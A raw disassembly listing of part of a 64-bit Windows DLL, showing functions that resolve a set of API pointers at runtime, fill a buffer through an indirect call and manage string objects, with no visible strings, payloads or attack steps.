   1800032ce:	ff 15 14 0e 03 00    	call   *0x30e14(%rip)        # 0x1800340e8
   1800032d4:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1800032d8:	48 2b f8             	sub    %rax,%rdi
   1800032db:	48 83 ff 09          	cmp    $0x9,%rdi
   1800032df:	0f 82 e4 02 00 00    	jb     0x1800035c9
   1800032e5:	4c 8b cb             	mov    %rbx,%r9
   1800032e8:	48 83 7b 18 10       	cmpq   $0x10,0x18(%rbx)
   1800032ed:	72 03                	jb     0x1800032f2
   1800032ef:	4c 8b 0b             	mov    (%rbx),%r9
   1800032f2:	48 c7 44 24 30 09 00 	movq   $0x9,0x30(%rsp)
   1800032f9:	00 00 
   1800032fb:	48 8d 0d e6 f9 03 00 	lea    0x3f9e6(%rip),%rcx        # 0x180042ce8
   180003302:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180003307:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000330c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180003311:	e8 aa 72 00 00       	call   0x18000a5c0
   180003316:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   18000331b:	48 83 7c 24 58 10    	cmpq   $0x10,0x58(%rsp)
   180003321:	48 0f 43 4c 24 40    	cmovae 0x40(%rsp),%rcx
   180003327:	33 d2                	xor    %edx,%edx
   180003329:	44 8d 42 08          	lea    0x8(%rdx),%r8d
   18000332d:	ff 15 9d 0d 03 00    	call   *0x30d9d(%rip)        # 0x1800340d0
   180003333:	48 8b f8             	mov    %rax,%rdi
   180003336:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   18000333b:	48 83 fa 10          	cmp    $0x10,%rdx
   18000333f:	72 32                	jb     0x180003373
   180003341:	48 ff c2             	inc    %rdx
   180003344:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   180003349:	48 8b c1             	mov    %rcx,%rax
   18000334c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180003353:	72 19                	jb     0x18000336e
   180003355:	48 83 c2 27          	add    $0x27,%rdx
   180003359:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   18000335d:	48 2b c1             	sub    %rcx,%rax
   180003360:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180003364:	48 83 f8 1f          	cmp    $0x1f,%rax
   180003368:	0f 87 61 02 00 00    	ja     0x1800035cf
   18000336e:	e8 19 95 00 00       	call   0x18000c88c
   180003373:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   180003378:	48 c7 44 24 58 0f 00 	movq   $0xf,0x58(%rsp)
   18000337f:	00 00 
   180003381:	c6 44 24 40 00       	movb   $0x0,0x40(%rsp)
   180003386:	48 85 ff             	test   %rdi,%rdi
   180003389:	0f 84 1d 01 00 00    	je     0x1800034ac
   18000338f:	48 8d 15 62 f9 03 00 	lea    0x3f962(%rip),%rdx        # 0x180042cf8
   180003396:	48 8b cf             	mov    %rdi,%rcx
   180003399:	ff 15 d9 0c 03 00    	call   *0x30cd9(%rip)        # 0x180034078
   18000339f:	48 89 05 92 8c 04 00 	mov    %rax,0x48c92(%rip)        # 0x18004c038
   1800033a6:	48 8d 15 5b f9 03 00 	lea    0x3f95b(%rip),%rdx        # 0x180042d08
   1800033ad:	48 8b cf             	mov    %rdi,%rcx
   1800033b0:	ff 15 c2 0c 03 00    	call   *0x30cc2(%rip)        # 0x180034078
   1800033b6:	48 89 05 8b 8c 04 00 	mov    %rax,0x48c8b(%rip)        # 0x18004c048
   1800033bd:	48 8d 15 54 f9 03 00 	lea    0x3f954(%rip),%rdx        # 0x180042d18
   1800033c4:	48 8b cf             	mov    %rdi,%rcx
   1800033c7:	ff 15 ab 0c 03 00    	call   *0x30cab(%rip)        # 0x180034078
   1800033cd:	48 89 05 ac 8c 04 00 	mov    %rax,0x48cac(%rip)        # 0x18004c080
   1800033d4:	48 8d 15 55 f9 03 00 	lea    0x3f955(%rip),%rdx        # 0x180042d30
   1800033db:	48 8b cf             	mov    %rdi,%rcx
   1800033de:	ff 15 94 0c 03 00    	call   *0x30c94(%rip)        # 0x180034078
   1800033e4:	48 89 05 7d 8c 04 00 	mov    %rax,0x48c7d(%rip)        # 0x18004c068
   1800033eb:	48 8d 15 4e f9 03 00 	lea    0x3f94e(%rip),%rdx        # 0x180042d40
   1800033f2:	48 8b cf             	mov    %rdi,%rcx
   1800033f5:	ff 15 7d 0c 03 00    	call   *0x30c7d(%rip)        # 0x180034078
   1800033fb:	48 89 05 5e 8c 04 00 	mov    %rax,0x48c5e(%rip)        # 0x18004c060
   180003402:	48 8d 15 4f f9 03 00 	lea    0x3f94f(%rip),%rdx        # 0x180042d58
   180003409:	48 8b cf             	mov    %rdi,%rcx
   18000340c:	ff 15 66 0c 03 00    	call   *0x30c66(%rip)        # 0x180034078
   180003412:	48 89 05 3f 8c 04 00 	mov    %rax,0x48c3f(%rip)        # 0x18004c058
   180003419:	48 8d 15 48 f9 03 00 	lea    0x3f948(%rip),%rdx        # 0x180042d68
   180003420:	48 8b cf             	mov    %rdi,%rcx
   180003423:	ff 15 4f 0c 03 00    	call   *0x30c4f(%rip)        # 0x180034078
   180003429:	48 89 05 48 8c 04 00 	mov    %rax,0x48c48(%rip)        # 0x18004c078
   180003430:	48 8d 15 49 f9 03 00 	lea    0x3f949(%rip),%rdx        # 0x180042d80
   180003437:	48 8b cf             	mov    %rdi,%rcx
   18000343a:	ff 15 38 0c 03 00    	call   *0x30c38(%rip)        # 0x180034078
   180003440:	48 89 05 e9 8b 04 00 	mov    %rax,0x48be9(%rip)        # 0x18004c030
   180003447:	48 8d 15 42 f9 03 00 	lea    0x3f942(%rip),%rdx        # 0x180042d90
   18000344e:	48 8b cf             	mov    %rdi,%rcx
   180003451:	ff 15 21 0c 03 00    	call   *0x30c21(%rip)        # 0x180034078
   180003457:	48 89 05 f2 8b 04 00 	mov    %rax,0x48bf2(%rip)        # 0x18004c050
   18000345e:	48 8d 15 43 f9 03 00 	lea    0x3f943(%rip),%rdx        # 0x180042da8
   180003465:	48 8b cf             	mov    %rdi,%rcx
   180003468:	ff 15 0a 0c 03 00    	call   *0x30c0a(%rip)        # 0x180034078
   18000346e:	48 89 05 cb 8b 04 00 	mov    %rax,0x48bcb(%rip)        # 0x18004c040
   180003475:	48 8d 15 3c f9 03 00 	lea    0x3f93c(%rip),%rdx        # 0x180042db8
   18000347c:	48 8b cf             	mov    %rdi,%rcx
   18000347f:	ff 15 f3 0b 03 00    	call   *0x30bf3(%rip)        # 0x180034078
   180003485:	48 89 05 e4 8b 04 00 	mov    %rax,0x48be4(%rip)        # 0x18004c070
   18000348c:	48 8d 15 65 f8 03 00 	lea    0x3f865(%rip),%rdx        # 0x180042cf8
   180003493:	48 8b cf             	mov    %rdi,%rcx
   180003496:	ff 15 dc 0b 03 00    	call   *0x30bdc(%rip)        # 0x180034078
   18000349c:	48 8d 15 65 f8 03 00 	lea    0x3f865(%rip),%rdx        # 0x180042d08
   1800034a3:	48 8b cf             	mov    %rdi,%rcx
   1800034a6:	ff 15 cc 0b 03 00    	call   *0x30bcc(%rip)        # 0x180034078
   1800034ac:	48 83 3d 84 8b 04 00 	cmpq   $0x0,0x48b84(%rip)        # 0x18004c038
   1800034b3:	00 
   1800034b4:	74 3c                	je     0x1800034f2
   1800034b6:	48 83 3d 8a 8b 04 00 	cmpq   $0x0,0x48b8a(%rip)        # 0x18004c048
   1800034bd:	00 
   1800034be:	74 32                	je     0x1800034f2
   1800034c0:	48 83 3d b8 8b 04 00 	cmpq   $0x0,0x48bb8(%rip)        # 0x18004c080
   1800034c7:	00 
   1800034c8:	74 28                	je     0x1800034f2
   1800034ca:	48 83 3d 8e 8b 04 00 	cmpq   $0x0,0x48b8e(%rip)        # 0x18004c060
   1800034d1:	00 
   1800034d2:	74 1e                	je     0x1800034f2
   1800034d4:	48 83 3d 7c 8b 04 00 	cmpq   $0x0,0x48b7c(%rip)        # 0x18004c058
   1800034db:	00 
   1800034dc:	74 14                	je     0x1800034f2
   1800034de:	48 83 3d 82 8b 04 00 	cmpq   $0x0,0x48b82(%rip)        # 0x18004c068
   1800034e5:	00 
   1800034e6:	74 0a                	je     0x1800034f2
   1800034e8:	48 83 3d 88 8b 04 00 	cmpq   $0x0,0x48b88(%rip)        # 0x18004c078
   1800034ef:	00 
   1800034f0:	75 03                	jne    0x1800034f5
   1800034f2:	41 8b f6             	mov    %r14d,%esi
   1800034f5:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
   1800034f9:	48 83 fa 10          	cmp    $0x10,%rdx
   1800034fd:	72 32                	jb     0x180003531
   1800034ff:	48 ff c2             	inc    %rdx
   180003502:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   180003507:	48 8b c1             	mov    %rcx,%rax
   18000350a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180003511:	72 19                	jb     0x18000352c
   180003513:	48 83 c2 27          	add    $0x27,%rdx
   180003517:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   18000351b:	48 2b c1             	sub    %rcx,%rax
   18000351e:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180003522:	48 83 f8 1f          	cmp    $0x1f,%rax
   180003526:	0f 87 85 00 00 00    	ja     0x1800035b1
   18000352c:	e8 5b 93 00 00       	call   0x18000c88c
   180003531:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
   180003536:	48 c7 45 80 0f 00 00 	movq   $0xf,-0x80(%rbp)
   18000353d:	00 
   18000353e:	c6 44 24 68 00       	movb   $0x0,0x68(%rsp)
   180003543:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   180003547:	48 83 fa 10          	cmp    $0x10,%rdx
   18000354b:	72 2c                	jb     0x180003579
   18000354d:	48 ff c2             	inc    %rdx
   180003550:	48 8b 0b             	mov    (%rbx),%rcx
   180003553:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000355a:	72 18                	jb     0x180003574
   18000355c:	48 83 c2 27          	add    $0x27,%rdx
   180003560:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180003564:	49 2b c8             	sub    %r8,%rcx
   180003567:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   18000356b:	48 83 f8 1f          	cmp    $0x1f,%rax
   18000356f:	77 46                	ja     0x1800035b7
   180003571:	49 8b c8             	mov    %r8,%rcx
   180003574:	e8 13 93 00 00       	call   0x18000c88c
   180003579:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   18000357d:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   180003584:	00 
   180003585:	c6 03 00             	movb   $0x0,(%rbx)
   180003588:	8b c6                	mov    %esi,%eax
   18000358a:	48 8b 8d 90 0f 00 00 	mov    0xf90(%rbp),%rcx
   180003591:	48 33 cc             	xor    %rsp,%rcx
   180003594:	e8 37 90 00 00       	call   0x18000c5d0
   180003599:	4c 8d 9c 24 a0 10 00 	lea    0x10a0(%rsp),%r11
   1800035a0:	00 
   1800035a1:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   1800035a5:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1800035a9:	49 8b e3             	mov    %r11,%rsp
   1800035ac:	41 5e                	pop    %r14
   1800035ae:	5f                   	pop    %rdi
   1800035af:	5d                   	pop    %rbp
   1800035b0:	c3                   	ret
   1800035b1:	e8 ca 75 01 00       	call   0x18001ab80
   1800035b6:	90                   	nop
   1800035b7:	e8 c4 75 01 00       	call   0x18001ab80
   1800035bc:	90                   	nop
   1800035bd:	e8 fe ea ff ff       	call   0x1800020c0
   1800035c2:	cc                   	int3
   1800035c3:	e8 b8 75 01 00       	call   0x18001ab80
   1800035c8:	cc                   	int3
   1800035c9:	e8 f2 ea ff ff       	call   0x1800020c0
   1800035ce:	cc                   	int3
   1800035cf:	e8 ac 75 01 00       	call   0x18001ab80
   1800035d4:	cc                   	int3
   1800035d5:	cc                   	int3
   1800035d6:	cc                   	int3
   1800035d7:	cc                   	int3
   1800035d8:	cc                   	int3
   1800035d9:	cc                   	int3
   1800035da:	cc                   	int3
   1800035db:	cc                   	int3
   1800035dc:	cc                   	int3
   1800035dd:	cc                   	int3
   1800035de:	cc                   	int3
   1800035df:	cc                   	int3
   1800035e0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800035e5:	55                   	push   %rbp
   1800035e6:	56                   	push   %rsi
   1800035e7:	57                   	push   %rdi
   1800035e8:	41 56                	push   %r14
   1800035ea:	41 57                	push   %r15
   1800035ec:	48 8d ac 24 a0 e0 ff 	lea    -0x1f60(%rsp),%rbp
   1800035f3:	ff 
   1800035f4:	b8 60 20 00 00       	mov    $0x2060,%eax
   1800035f9:	e8 b2 e7 02 00       	call   0x180031db0
   1800035fe:	48 2b e0             	sub    %rax,%rsp
   180003601:	48 8b 05 08 5a 04 00 	mov    0x45a08(%rip),%rax        # 0x180049010
   180003608:	48 33 c4             	xor    %rsp,%rax
   18000360b:	48 89 85 50 1f 00 00 	mov    %rax,0x1f50(%rbp)
   180003612:	48 8b fa             	mov    %rdx,%rdi
   180003615:	48 8b d9             	mov    %rcx,%rbx
   180003618:	48 89 4c 24 68       	mov    %rcx,0x68(%rsp)
   18000361d:	48 89 55 88          	mov    %rdx,-0x78(%rbp)
   180003621:	45 33 ff             	xor    %r15d,%r15d
   180003624:	44 89 7c 24 40       	mov    %r15d,0x40(%rsp)
   180003629:	c7 45 a8 a0 1f 00 00 	movl   $0x1fa0,-0x58(%rbp)
   180003630:	4c 89 39             	mov    %r15,(%rcx)
   180003633:	4c 89 79 10          	mov    %r15,0x10(%rcx)
   180003637:	48 c7 41 18 0f 00 00 	movq   $0xf,0x18(%rcx)
   18000363e:	00 
   18000363f:	44 88 39             	mov    %r15b,(%rcx)
   180003642:	45 33 c0             	xor    %r8d,%r8d
   180003645:	48 8d 15 87 f4 03 00 	lea    0x3f487(%rip),%rdx        # 0x180042ad3
   18000364c:	e8 3f 56 00 00       	call   0x180008c90
   180003651:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   180003658:	00 
   180003659:	33 d2                	xor    %edx,%edx
   18000365b:	41 b8 a0 1f 00 00    	mov    $0x1fa0,%r8d
   180003661:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   180003665:	e8 a6 c0 00 00       	call   0x18000f710
   18000366a:	48 8b cf             	mov    %rdi,%rcx
   18000366d:	48 83 7f 18 10       	cmpq   $0x10,0x18(%rdi)
   180003672:	72 03                	jb     0x180003677
   180003674:	48 8b 0f             	mov    (%rdi),%rcx
   180003677:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   18000367c:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   180003681:	48 8d 45 a8          	lea    -0x58(%rbp),%rax
   180003685:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000368a:	4c 8d 4d b0          	lea    -0x50(%rbp),%r9
   18000368e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180003694:	8b 57 10             	mov    0x10(%rdi),%edx
   180003697:	ff 15 ab 09 03 00    	call   *0x309ab(%rip)        # 0x180034048
   18000369d:	85 c0                	test   %eax,%eax
   18000369f:	0f 84 b4 01 00 00    	je     0x180003859
   1800036a5:	ff 15 d5 89 04 00    	call   *0x489d5(%rip)        # 0x18004c080
   1800036ab:	4c 8b f0             	mov    %rax,%r14
   1800036ae:	48 85 c0             	test   %rax,%rax
   1800036b1:	0f 84 8c 01 00 00    	je     0x180003843
   1800036b7:	45 33 c0             	xor    %r8d,%r8d
   1800036ba:	41 8d 50 01          	lea    0x1(%r8),%edx
   1800036be:	48 8b c8             	mov    %rax,%rcx
   1800036c1:	ff 15 99 89 04 00    	call   *0x48999(%rip)        # 0x18004c060
   1800036c7:	85 c0                	test   %eax,%eax
   1800036c9:	0f 85 54 01 00 00    	jne    0x180003823
   1800036cf:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   1800036d3:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   1800036d7:	8b 45 a8             	mov    -0x58(%rbp),%eax
   1800036da:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   1800036de:	4c 89 7c 24 78       	mov    %r15,0x78(%rsp)
   1800036e3:	4c 89 7d 80          	mov    %r15,-0x80(%rbp)
   1800036e7:	45 33 c0             	xor    %r8d,%r8d
   1800036ea:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1800036ef:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   1800036f3:	ff 15 5f 89 04 00    	call   *0x4895f(%rip)        # 0x18004c058
   1800036f9:	85 c0                	test   %eax,%eax
   1800036fb:	0f 85 13 01 00 00    	jne    0x180003814
   180003701:	48 8b 75 80          	mov    -0x80(%rbp),%rsi
   180003705:	4c 8b c6             	mov    %rsi,%r8
   180003708:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   18000370d:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   180003711:	e8 1a c2 00 00       	call   0x18000f930
   180003716:	48 81 fe a0 1f 00 00 	cmp    $0x1fa0,%rsi
   18000371d:	0f 83 a4 01 00 00    	jae    0x1800038c7
   180003723:	c6 44 35 b0 00       	movb   $0x0,-0x50(%rbp,%rsi,1)
   180003728:	4c 89 7c 24 48       	mov    %r15,0x48(%rsp)
   18000372d:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   180003732:	48 c7 44 24 60 0f 00 	movq   $0xf,0x60(%rsp)
   180003739:	00 00 
   18000373b:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   18000373f:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   180003746:	49 ff c0             	inc    %r8
   180003749:	42 80 3c 00 00       	cmpb   $0x0,(%rax,%r8,1)
   18000374e:	75 f6                	jne    0x180003746
   180003750:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   180003754:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   180003759:	e8 32 55 00 00       	call   0x180008c90
   18000375e:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   180003763:	48 3b d8             	cmp    %rax,%rbx
   180003766:	74 64                	je     0x1800037cc
   180003768:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   18000376c:	48 83 fa 10          	cmp    $0x10,%rdx
   180003770:	72 30                	jb     0x1800037a2
   180003772:	48 8b 0b             	mov    (%rbx),%rcx
   180003775:	48 ff c2             	inc    %rdx
   180003778:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000377f:	72 1c                	jb     0x18000379d
   180003781:	48 83 c2 27          	add    $0x27,%rdx
   180003785:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180003789:	49 2b c8             	sub    %r8,%rcx
   18000378c:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180003790:	48 83 f8 1f          	cmp    $0x1f,%rax
   180003794:	0f 87 39 01 00 00    	ja     0x1800038d3
   18000379a:	49 8b c8             	mov    %r8,%rcx
   18000379d:	e8 ea 90 00 00       	call   0x18000c88c
   1800037a2:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   1800037a9:	00 
   1800037aa:	c6 03 00             	movb   $0x0,(%rbx)
   1800037ad:	0f 10 44 24 48       	movups 0x48(%rsp),%xmm0
   1800037b2:	0f 11 03             	movups %xmm0,(%rbx)
   1800037b5:	0f 10 4c 24 58       	movups 0x58(%rsp),%xmm1
   1800037ba:	0f 11 4b 10          	movups %xmm1,0x10(%rbx)
   1800037be:	49 8b ce             	mov    %r14,%rcx
   1800037c1:	ff 15 a1 88 04 00    	call   *0x488a1(%rip)        # 0x18004c068
   1800037c7:	e9 8d 00 00 00       	jmp    0x180003859
   1800037cc:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1800037d1:	48 83 fa 10          	cmp    $0x10,%rdx
   1800037d5:	72 61                	jb     0x180003838
   1800037d7:	48 ff c2             	inc    %rdx
   1800037da:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1800037df:	48 8b c1             	mov    %rcx,%rax
   1800037e2:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800037e9:	72 19                	jb     0x180003804
   1800037eb:	48 83 c2 27          	add    $0x27,%rdx
   1800037ef:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800037f3:	48 2b c1             	sub    %rcx,%rax
   1800037f6:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800037fa:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800037fe:	0f 87 cf 00 00 00    	ja     0x1800038d3
   180003804:	e8 83 90 00 00       	call   0x18000c88c
   180003809:	49 8b ce             	mov    %r14,%rcx
   18000380c:	ff 15 56 88 04 00    	call   *0x48856(%rip)        # 0x18004c068
   180003812:	eb 45                	jmp    0x180003859
   180003814:	41 b8 11 00 00 00    	mov    $0x11,%r8d
   18000381a:	48 8d 15 af f5 03 00 	lea    0x3f5af(%rip),%rdx        # 0x180042dd0
   180003821:	eb 0d                	jmp    0x180003830
   180003823:	41 b8 15 00 00 00    	mov    $0x15,%r8d
   180003829:	48 8d 15 b8 f5 03 00 	lea    0x3f5b8(%rip),%rdx        # 0x180042de8
   180003830:	48 8b cb             	mov    %rbx,%rcx
   180003833:	e8 58 54 00 00       	call   0x180008c90
   180003838:	49 8b ce             	mov    %r14,%rcx
   18000383b:	ff 15 27 88 04 00    	call   *0x48827(%rip)        # 0x18004c068
   180003841:	eb 16                	jmp    0x180003859
   180003843:	41 b8 18 00 00 00    	mov    $0x18,%r8d
   180003849:	48 8d 15 b0 f5 03 00 	lea    0x3f5b0(%rip),%rdx        # 0x180042e00
   180003850:	48 8b cb             	mov    %rbx,%rcx
   180003853:	e8 38 54 00 00       	call   0x180008c90
   180003858:	90                   	nop
   180003859:	48 8b 57 18          	mov    0x18(%rdi),%rdx
   18000385d:	48 83 fa 10          	cmp    $0x10,%rdx
   180003861:	72 2c                	jb     0x18000388f
   180003863:	48 ff c2             	inc    %rdx
   180003866:	48 8b 0f             	mov    (%rdi),%rcx
   180003869:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180003870:	72 18                	jb     0x18000388a
   180003872:	48 83 c2 27          	add    $0x27,%rdx
   180003876:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   18000387a:	49 2b c8             	sub    %r8,%rcx
   18000387d:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180003881:	48 83 f8 1f          	cmp    $0x1f,%rax
   180003885:	77 46                	ja     0x1800038cd
   180003887:	49 8b c8             	mov    %r8,%rcx
   18000388a:	e8 fd 8f 00 00       	call   0x18000c88c
   18000388f:	4c 89 7f 10          	mov    %r15,0x10(%rdi)
   180003893:	48 c7 47 18 0f 00 00 	movq   $0xf,0x18(%rdi)
   18000389a:	00 
   18000389b:	c6 07 00             	movb   $0x0,(%rdi)
   18000389e:	48 8b c3             	mov    %rbx,%rax
   1800038a1:	48 8b 8d 50 1f 00 00 	mov    0x1f50(%rbp),%rcx
   1800038a8:	48 33 cc             	xor    %rsp,%rcx
   1800038ab:	e8 20 8d 00 00       	call   0x18000c5d0
   1800038b0:	48 8b 9c 24 a0 20 00 	mov    0x20a0(%rsp),%rbx
   1800038b7:	00 
   1800038b8:	48 81 c4 60 20 00 00 	add    $0x2060,%rsp
   1800038bf:	41 5f                	pop    %r15
   1800038c1:	41 5e                	pop    %r14
   1800038c3:	5f                   	pop    %rdi
   1800038c4:	5e                   	pop    %rsi
   1800038c5:	5d                   	pop    %rbp
   1800038c6:	c3                   	ret
   1800038c7:	e8 2c 8e 00 00       	call   0x18000c6f8
   1800038cc:	90                   	nop
   1800038cd:	e8 ae 72 01 00       	call   0x18001ab80
   1800038d2:	90                   	nop
   1800038d3:	e8 a8 72 01 00       	call   0x18001ab80
   1800038d8:	cc                   	int3
   1800038d9:	cc                   	int3
   1800038da:	cc                   	int3
   1800038db:	cc                   	int3
   1800038dc:	cc                   	int3
   1800038dd:	cc                   	int3
   1800038de:	cc                   	int3
   1800038df:	cc                   	int3
   1800038e0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800038e5:	55                   	push   %rbp
   1800038e6:	56                   	push   %rsi
   1800038e7:	57                   	push   %rdi
   1800038e8:	41 54                	push   %r12
   1800038ea:	41 55                	push   %r13
   1800038ec:	41 56                	push   %r14
   1800038ee:	41 57                	push   %r15
   1800038f0:	48 8d ac 24 20 fc ff 	lea    -0x3e0(%rsp),%rbp
   1800038f7:	ff 
   1800038f8:	48 81 ec e0 04 00 00 	sub    $0x4e0,%rsp
   1800038ff:	48 8b 05 0a 57 04 00 	mov    0x4570a(%rip),%rax        # 0x180049010
   180003906:	48 33 c4             	xor    %rsp,%rax
   180003909:	48 89 85 d0 03 00 00 	mov    %rax,0x3d0(%rbp)
   180003910:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   180003914:	4c 8b f1             	mov    %rcx,%r14
   180003917:	48 89 4d 98          	mov    %rcx,-0x68(%rbp)
   18000391b:	48 89 8d c8 00 00 00 	mov    %rcx,0xc8(%rbp)
   180003922:	45 33 ed             	xor    %r13d,%r13d
   180003925:	44 89 6c 24 50       	mov    %r13d,0x50(%rsp)
   18000392a:	44 89 6c 24 48       	mov    %r13d,0x48(%rsp)
   18000392f:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   180003935:	44 89 64 24 58       	mov    %r12d,0x58(%rsp)
   18000393a:	44 89 2a             	mov    %r13d,(%rdx)
   18000393d:	41 8d 4d 20          	lea    0x20(%r13),%ecx
   180003941:	e8 b2 72 01 00       	call   0x18001abf8
   180003946:	4c 8b f8             	mov    %rax,%r15
   180003949:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   18000394e:	33 d2                	xor    %edx,%edx
   180003950:	41 b8 f8 00 00 00    	mov    $0xf8,%r8d
   180003956:	48 8d 8d d0 02 00 00 	lea    0x2d0(%rbp),%rcx
   18000395d:	e8 ae bd 00 00       	call   0x18000f710
   180003962:	48 8d 1d 97 c6 ff ff 	lea    -0x3969(%rip),%rbx        # 0x180000000
   180003969:	48 8d 8b 00 32 04 00 	lea    0x43200(%rbx),%rcx
   180003970:	48 89 8d d0 02 00 00 	mov    %rcx,0x2d0(%rbp)
   180003977:	48 8d 8b 20 31 04 00 	lea    0x43120(%rbx),%rcx
   18000397e:	48 89 8d e0 02 00 00 	mov    %rcx,0x2e0(%rbp)
   180003985:	4c 89 ad 70 03 00 00 	mov    %r13,0x370(%rbp)
   18000398c:	4c 89 ad 98 03 00 00 	mov    %r13,0x398(%rbp)
   180003993:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003996:	66 0f 7f 85 a0 03 00 	movdqa %xmm0,0x3a0(%rbp)
   18000399d:	00 
   18000399e:	44 89 64 24 50       	mov    %r12d,0x50(%rsp)
   1800039a3:	48 8d 3d 2e f8 03 00 	lea    0x3f82e(%rip),%rdi        # 0x1800431d8
   1800039aa:	48 89 bd 68 03 00 00 	mov    %rdi,0x368(%rbp)
   1800039b1:	c7 85 64 03 00 00 80 	movl   $0x80,0x364(%rbp)
   1800039b8:	00 00 00 
   1800039bb:	4c 89 ad d8 02 00 00 	mov    %r13,0x2d8(%rbp)
   1800039c2:	45 33 c0             	xor    %r8d,%r8d
   1800039c5:	48 8d 95 e8 02 00 00 	lea    0x2e8(%rbp),%rdx
   1800039cc:	48 8d 8d 68 03 00 00 	lea    0x368(%rbp),%rcx
   1800039d3:	e8 98 56 00 00       	call   0x180009070
   1800039d8:	90                   	nop
   1800039d9:	48 8b 85 e0 02 00 00 	mov    0x2e0(%rbp),%rax
   1800039e0:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800039e4:	48 8d 05 55 0e 03 00 	lea    0x30e55(%rip),%rax        # 0x180034840
   1800039eb:	48 89 84 0d e0 02 00 	mov    %rax,0x2e0(%rbp,%rcx,1)
   1800039f2:	00 
   1800039f3:	48 8b 85 e0 02 00 00 	mov    0x2e0(%rbp),%rax
   1800039fa:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800039fe:	8d 51 f0             	lea    -0x10(%rcx),%edx
   180003a01:	89 94 0d dc 02 00 00 	mov    %edx,0x2dc(%rbp,%rcx,1)
   180003a08:	48 8b 85 d0 02 00 00 	mov    0x2d0(%rbp),%rax
   180003a0f:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003a13:	48 8d 05 16 f7 03 00 	lea    0x3f716(%rip),%rax        # 0x180043130
   180003a1a:	48 89 84 0d d0 02 00 	mov    %rax,0x2d0(%rbp,%rcx,1)
   180003a21:	00 
   180003a22:	48 8b 85 d0 02 00 00 	mov    0x2d0(%rbp),%rax
   180003a29:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003a2d:	8d 51 e0             	lea    -0x20(%rcx),%edx
   180003a30:	89 94 0d cc 02 00 00 	mov    %edx,0x2cc(%rbp,%rcx,1)
   180003a37:	48 8b 85 d0 02 00 00 	mov    0x2d0(%rbp),%rax
   180003a3e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003a42:	48 8d 05 77 f7 03 00 	lea    0x3f777(%rip),%rax        # 0x1800431c0
   180003a49:	48 89 84 0d d0 02 00 	mov    %rax,0x2d0(%rbp,%rcx,1)
   180003a50:	00 
   180003a51:	48 8b 85 d0 02 00 00 	mov    0x2d0(%rbp),%rax
   180003a58:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003a5c:	8d 91 68 ff ff ff    	lea    -0x98(%rcx),%edx
   180003a62:	89 94 0d cc 02 00 00 	mov    %edx,0x2cc(%rbp,%rcx,1)
   180003a69:	48 8d 8d e8 02 00 00 	lea    0x2e8(%rbp),%rcx
